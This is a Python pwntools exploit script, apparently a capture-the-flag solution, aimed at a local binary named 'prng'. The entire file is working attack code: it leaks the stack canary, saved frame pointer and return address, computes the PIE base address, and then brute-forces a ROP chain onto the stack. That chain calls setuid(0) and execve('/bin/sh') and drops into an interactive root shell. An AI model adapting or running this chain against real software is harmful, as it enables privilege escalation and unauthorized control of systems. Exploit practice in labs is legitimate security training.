#!/usr/bin/env python3
from pwn import *
import struct
import binascii

# Fine-tunables
CANARY_OFFSET = 24
DIFF_FROM_BASE = 0x998e

def leak_and_destroy(size):
    """
        Leak data from the stack and destroy it in the process.
    """

    # Leak byte by byte
    p = log.progress('Leaking stack data (%d bytes)' % (size,))
    raw_bytes = []
    for i in range(size):
        r.recvuntil(b'finish: ')
        r.sendline(str(CANARY_OFFSET + i).encode())
        r.recvline()
        raw_bytes.append(int(r.recvline().split(b':')[1].strip(), 16))
        p.status('%d/%d' % (i + 1, size))

    # Return as bytes
    raw_bytes = bytes(raw_bytes)
    p.success(binascii.hexlify(raw_bytes).decode())
    return raw_bytes

def bruteforce_write(buffer):
    """
        Writes a buffer at the stack by brute-forcing the PRNG backwards.
    """

    # Writing buffer by brute-forcing in reverse
    p = log.progress('Brute-force writing in reverse (%d bytes)' % (len(buffer),))
    for i in range(len(buffer)):
        while True:
            r.recvuntil(b'finish: ')
            r.sendline(str(CANARY_OFFSET + len(buffer) - i).encode())
            if int(r.recvline().split(b':')[1].strip(), 16) == buffer[len(buffer) - i - 1]:
                p.status(r'%d\%d' % (i + 1, len(buffer)))
                break
    p.success()

def build_rop(base_addr):

    """
        Builds our ROP payload, built with ROPgadget (and some manual work).
            1. To handle PIE we simply calculate a base address ahead of time.
            2. To handle the dropping of EUID privileges by /bin/sh we call setuid(0).
    """

    p = b''

    # setuid(0)
    p += struct.pack('<Q', base_addr + 0x0000000000009fbd) # pop rdi; ret
    p += struct.pack('<Q', 0)                              # argument to setuid(0)
    p += struct.pack('<Q', base_addr + 0x0000000000049bb7) # pop rax ; ret
    p += struct.pack('<Q', 0x69)                           # setuid
    p += struct.pack('<Q', base_addr + 0x0000000000028e12) # syscall ; ret

    # execve() of "/bin/sh"
    p += struct.pack('<Q', base_addr + 0x0000000000017ac2) # pop rsi ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce000) # @ .data
    p += struct.pack('<Q', base_addr + 0x0000000000049bb7) # pop rax ; ret
    p += b'/bin//sh'
    p += struct.pack('<Q', base_addr + 0x000000000004c501) # mov qword ptr [rsi], rax ; ret
    p += struct.pack('<Q', base_addr + 0x0000000000017ac2) # pop rsi ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce008) # @ .data + 8
    p += struct.pack('<Q', base_addr + 0x000000000003c9e0) # xor rax, rax ; ret
    p += struct.pack('<Q', base_addr + 0x000000000004c501) # mov qword ptr [rsi], rax ; ret
    p += struct.pack('<Q', base_addr + 0x0000000000009fbd) # pop rdi ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce000) # @ .data
    p += struct.pack('<Q', base_addr + 0x0000000000017ac2) # pop rsi ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce008) # @ .data + 8
    p += struct.pack('<Q', base_addr + 0x000000000008e237) # pop rdx ; pop rbx ; ret
    p += struct.pack('<Q', base_addr + 0x00000000000ce008) # @ .data + 8
    p += struct.pack('<Q', base_addr + 0x4141414141414141) # padding
    p += struct.pack('<Q', base_addr + 0x0000000000049bb7) # pop rax ; ret
    p += struct.pack('<Q', 0x3b)                           # execve
    p += struct.pack('<Q', base_addr + 0x00000000000092a2) # syscall

    # Return the ROP bytes
    return p

# Connect to process and start PRNG with option 1
r = process('./prng')
r.recvuntil(b'Choice? ')
r.sendline(b'1')

# Leak the canary, the old RBP and the return address from the stack
canary, old_rbp, ret_addr = struct.unpack('<QQQ', leak_and_destroy(struct.calcsize('<QQQ')))
log.info('Canary = 0x%.16x' % (canary,))
log.info('RBP frame = 0x%.16x' % (old_rbp,))
log.info('RET addr = 0x%.16x' % (ret_addr,))

# Build the raw ROP and add the old RBP and canary
base_addr = ret_addr - DIFF_FROM_BASE
log.info('Base addr = 0x%.16x' % (base_addr,))
raw_rop = struct.pack('<QQ', canary, old_rbp) + build_rop(base_addr)

# Write the ROP bytes
bruteforce_write(raw_rop)

# Trigger the return
r.recvuntil(b'finish: ')
r.sendline(b'0')

# Interactively enjoy the shell
r.interactive()
